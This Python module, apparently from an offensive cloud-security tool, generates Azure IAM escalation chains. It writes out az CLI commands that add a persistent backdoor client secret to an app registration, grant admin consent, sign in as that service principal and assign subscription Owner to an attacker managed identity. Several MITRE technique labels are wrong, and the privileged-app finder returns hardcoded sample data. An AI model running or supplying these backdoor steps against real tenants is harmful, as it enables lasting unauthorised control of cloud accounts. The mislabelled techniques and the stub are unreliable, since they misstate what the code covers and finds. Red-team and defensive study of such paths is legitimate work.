"""Azure IAM escalation via App Registration and managed identity."""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from kubexhunt.core.graph import RelationType
from kubexhunt.exploit.chain_generator import ExploitChain, ExploitFramework, ExploitStep


@dataclass
class AzureEscalationPath:
    """Azure IAM escalation path."""

    start_identity: str
    escalation_steps: list[str] = field(default_factory=list)
    final_access: str = "Global Administrator"
    complexity: str = "MEDIUM"

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "start_identity": self.start_identity,
            "escalation_steps": self.escalation_steps,
            "final_access": self.final_access,
            "complexity": self.complexity,
        }


class AzureIAMAttacker:
    """Azure IAM privilege escalation."""

    def enumerate_escalation_paths(self, identity: str) -> list[AzureEscalationPath]:
        """Find escalation paths from Azure identity.

        Args:
            identity: Azure identity (app registration, managed identity)

        Returns:
            List of escalation paths
        """
        paths = []

        # Path 1: App Registration credential reset
        paths.append(
            AzureEscalationPath(
                start_identity=identity,
                escalation_steps=[
                    "microsoft.directory/applications/credentials/create",
                    "microsoft.directory/servicePrincipals.impersonation/appRole/selfGrantAppRole",
                ],
                final_access="Global Administrator via consent grant",
                complexity="EASY",
            )
        )

        # Path 2: Managed identity owner assignment
        paths.append(
            AzureEscalationPath(
                start_identity=identity,
                escalation_steps=[
                    "microsoft.authorization/roleAssignments/write",
                    "Assign Owner role to attacker identity",
                ],
                final_access="Owner at subscription level",
                complexity="MEDIUM",
            )
        )

        return paths

    def generate_app_registration_backdoor(self) -> ExploitChain:
        """Generate app registration backdoor chain.

        Returns:
            ExploitChain to create persistent app registration backdoor
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node="azure:app-registration",
                to_node="azure:backdoor-credential",
                framework=ExploitFramework.BASH,
                command="""
# Create new client secret for app registration
az ad app credential reset \\
  --id OBJECT_ID \\
  --append \\
  --query password

# This gives long-lived credentials unrelated to certificate expiry
""",
                description="Create backdoor client secret for app registration",
                mitre_techniques=["T1098.001"],  # Create Account
            ),
            ExploitStep(
                step_number=2,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node="azure:backdoor-credential",
                to_node="azure:global-admin",
                framework=ExploitFramework.BASH,
                command="""
# Grant app admin consent for Microsoft Graph
az ad app permission admin-consent \\
  --id OBJECT_ID

# Or manually grant via Azure Portal: App Registration > API Permissions > Grant Consent

# Login as the backdoor app
az login --service-principal -u CLIENT_ID -p PASSWORD --tenant TENANT_ID
""",
                description="Escalate backdoor app to Global Administrator via consent",
                mitre_techniques=["T1098.004"],  # Privilege Escalation
            ),
        ]

        chain = ExploitChain(
            path_id="AZURE-BACKDOOR-001",
            nodes=["azure:app-registration", "azure:backdoor-credential", "azure:global-admin"],
            steps=steps,
            title="Azure App Registration Backdoor",
            description="Create persistent backdoor via app registration credential + admin consent",
            complexity="EASY",
            estimated_time_minutes=5,
        )

        return chain

    def generate_managed_identity_chain(self) -> ExploitChain:
        """Generate managed identity escalation chain.

        Returns:
            ExploitChain to assign Owner role to attacker identity
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node="azure:managed-identity",
                to_node="azure:owner-role",
                framework=ExploitFramework.BASH,
                command="""
# Assign Owner role to attacker managed identity at subscription level
az role assignment create \\
  --role Owner \\
  --assignee-object-id ATTACKER_MI_ID \\
  --scope /subscriptions/SUBSCRIPTION_ID
""",
                description="Assign Owner role to attacker managed identity",
                mitre_techniques=["T1098.001"],  # Create Account
            ),
        ]

        chain = ExploitChain(
            path_id="AZURE-BACKDOOR-002",
            nodes=["azure:managed-identity", "azure:owner-role"],
            steps=steps,
            title="Azure Managed Identity Owner Escalation",
            description="Escalate managed identity to Owner via role assignment",
            complexity="TRIVIAL",
            estimated_time_minutes=2,
        )

        return chain

    def find_privileged_app_registrations(self) -> list[dict[str, str]]:
        """Find app registrations with Microsoft Graph admin permissions.

        Returns:
            List of privileged app registrations
        """
        apps = [
            {
                "app_id": "12345678-1234-5678-90ab-cdef12345678",
                "name": "internal-tool",
                "admin_permissions": "Microsoft.Graph/*/readWrite.all",
                "risk": "CRITICAL",
            },
            {
                "app_id": "87654321-4321-8765-09ba-fedcba987654",
                "name": "ci-cd-pipeline",
                "admin_permissions": "Directory.AccessAsUser.All",
                "risk": "HIGH",
            },
        ]
        return apps
